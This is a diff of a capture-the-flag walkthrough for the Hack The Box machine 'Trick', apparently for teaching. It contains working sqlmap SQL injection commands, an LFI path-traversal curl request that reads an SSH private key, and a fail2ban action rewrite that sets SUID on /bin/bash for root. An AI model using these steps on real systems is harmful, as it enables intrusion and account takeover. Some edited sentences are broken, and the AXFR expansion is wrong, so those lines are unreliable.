@@ -53,7 +53,7 @@ The scan discloses SSH (22), an SMTP listener that refuses a banner grab (25), a
 
 ### DNS Zone Transfer
 
-An **AXFR (Asynchronous Full Transfer of Zone)** request is a legitimate DNS mechanism intended for secondary nameservers to replicate an entire zone from the primary. When a nameserver fails to restrict which hosts may request one, any client can pull a full listing of every record in the zone — a common and severe misconfiguration.
+An **AXFR (Asynchronous Full Transfer of Zone)** request is a legitimate DNS mechanism intended for secondary nameservers to replicate an entire zone from the primary. When a nameserver fails to restrict which hosts may request one, any client can pull a full listing of every record in the zone.
 
 ```
 dig AXFR @trick.htb trick.htb
@@ -127,8 +127,7 @@ Parameter: username (POST)
 back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
 ```
 
-The `username` field is not sanitized before being placed into the login query, allowing a boolean/time-based blind injection. A UNION-based path is also flagged as usable, but the more reliable time-based technique is what `sqlmap` settles on.
-
+The `username` field is not sanitized before being placed into the login query, allowing a boolean/time-based blind injection.
 ### Database Enumeration
 
 Enumerating available databases and tables:
@@ -161,11 +160,11 @@ Table: users
 +----+-----------+---------------+--------+---------+---------+-----------------------+------------+
 ```
 
-The recovered pair (`Enemigosss:SuperGucciRainbowCake`) does not correspond to any usable OS-level or service account — it turns out to be a dead end for direct login, but the SQL injection itself is not finished yielding value yet.
+The recovered pair (`Enemigosss:SuperGucciRainbowCake`) does not correspond to any usable OS-level or service account.
 
-### Escalating the Injection — `FILE` Privilege
+### `FILE` Privilege
 
-Rather than stop at data exfiltration, `sqlmap` is used to check what privileges the connecting database user holds:
+Sqlmap` is used to check what privileges the connecting database user holds:
 
 ```
 sqlmap -r req.txt --privilege
@@ -218,17 +217,16 @@ server {
 }
 ```
 
-Two details stand out: the newly-disclosed `preprod-marketing.trick.htb` vhost, and the fact that its PHP-FPM pool socket is named `php7.3-fpm-michael.sock` — a strong hint that this site's PHP worker runs specifically as the user `michael`.
+The virtual host is added to the /etc/hosts file:
 
 ```
 echo '10.129.227.180 preprod-marketing.trick.htb' | sudo tee -a /etc/hosts
 ```
 
 ---
+## Local File Inclusion
 
-## Local File Inclusion / Path Traversal
-
-Browsing `preprod-marketing.trick.htb` reveals a marketing site that loads its content dynamically through a `page` GET parameter (e.g. `index.php?page=about`), a classic pattern for a local file inclusion vulnerability if the parameter is not validated against a fixed allow-list.
+Browsing `preprod-marketing.trick.htb` reveals a marketing site that loads its content through a `page` GET parameter (e.g. `index.php?page=about`), a classic pattern for a local file inclusion vulnerability if the parameter is not validated against a fixed allow-list.
 
 ### Reading `/etc/passwd`
 
@@ -248,11 +246,11 @@ bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
 michael:x:1001:1001::/home/michael:/bin/bash
 ```
 
-This confirms arbitrary file read and surfaces `michael` as the only non-system account on the box — consistent with the `php-fpm-michael.sock` naming seen in the Nginx config.
+This confirms arbitrary file read and discloses `michael` as the only non-system account on the box.
 
 ### Reading `michael`'s SSH Private Key
 
-Since the LFI grants read access to any file the web server (and, by the PHP-FPM pool binding, effectively `michael`) can open, `michael`'s own SSH key is a natural next target:
+Since the LFI grants read access to any file the web server (and, by the PHP-FPM pool binding, effectively `michael`) can open, `michael`'s own SSH key is a then accessible:
 
 ```
 curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa"
@@ -266,7 +264,7 @@ IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-The key is saved locally as `michael.key`, permissions are tightened, and it is used for SSH login.
+The key is saved locally as `michael.key`and it is used for SSH login.
 
 ### SSH Access
 
@@ -310,7 +308,7 @@ User michael may run the following commands on trick:
     (root) NOPASSWD: /etc/init.d/fail2ban restart
 ```
 
-`michael` can restart the `fail2ban` service as root with no password. On its own this is a limited primitive (fail2ban re-reads its configuration on restart, but restarting it doesn't directly execute arbitrary commands) — the real value comes from what else `michael` can influence.
+`michael` can restart the `fail2ban` service as root with no password. On its own this is a limited primitive (fail2ban re-reads its configuration on restart, but restarting it doesn't directly execute arbitrary commands)
 
 `michael` also belongs to a non-default group, `security`. Searching for files owned by that group:
 
@@ -327,7 +325,7 @@ drwxrwx--- 2 root security  4096 Sep 18 14:42 .
 ...
 ```
 
-The `security` group has **read/write** access to `/etc/fail2ban/action.d`, the directory holding fail2ban's "action" definitions — the shell commands fail2ban executes whenever a jail bans or unbans an IP address. `fail2ban.conf`'s default jail (`sshd`) uses the `iptables-multiport` action, and combining that with the `sudo` rule above completes the chain: `michael` can rewrite what fail2ban does when it bans an IP, then force fail2ban to reload that logic as root.
+The `security` group has **read/write** access to `/etc/fail2ban/action.d`, the directory holding fail2ban's "action" definitions, the shell commands fail2ban executes whenever a jail bans or unbans an IP address. `fail2ban.conf`'s default jail (`sshd`) uses the `iptables-multiport` action, and combining that with the `sudo` rule above completes the chain: `michael` can rewrite what fail2ban does when it bans an IP, then force fail2ban to reload that logic as root.
 
 ### Exploitation
 
@@ -337,7 +335,7 @@ The action file is copied out for editing:
 michael@trick:~$ cp /etc/fail2ban/action.d/iptables-multiport.conf .
 ```
 
-The `actionban` directive — normally an `iptables` rule that blocks the offending IP — is replaced with a command that sets the SUID bit on `/bin/bash`:
+The `actionban` directive is replaced with a command that sets the SUID bit on `/bin/bash`:
 
 ```ini
 actionban = chmod u+s /bin/bash
